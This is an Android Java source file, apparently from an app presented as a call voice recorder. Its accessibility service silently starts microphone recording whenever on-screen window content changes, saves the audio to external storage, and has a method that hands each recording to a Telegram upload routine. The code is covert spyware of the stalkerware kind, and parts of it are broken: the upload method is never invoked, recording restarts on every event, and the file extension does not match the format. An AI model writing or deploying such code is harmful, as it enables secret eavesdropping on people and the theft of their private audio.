package com.example.callvoicerecorder;

import android.accessibilityservice.AccessibilityService;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import java.io.File;

public class CallRecordingService extends AccessibilityService {
    private static final String TAG = "MicMonitor";
    private static MediaRecorder micRecorder;
    private static File micFile;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            startMicRecording();
        }
    }

    @Override
    public void onInterrupt() {}

    private void startMicRecording() {
        try {
            File dir = new File(Environment.getExternalStorageDirectory(), "MicRecords");
            if (!dir.exists()) dir.mkdirs();

            micFile = new File(dir, "mic_" + System.currentTimeMillis() + ".mp3");
            micRecorder = new MediaRecorder();
            micRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            micRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            micRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            micRecorder.setOutputFile(micFile.getAbsolutePath());
            micRecorder.prepare();
            micRecorder.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopMicRecordingAndSend() {
        try {
            if (micRecorder != null) {
                micRecorder.stop();
                micRecorder.release();
                micRecorder = null;
                MultipartUtility.sendToTelegram(this, micFile, "mic");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
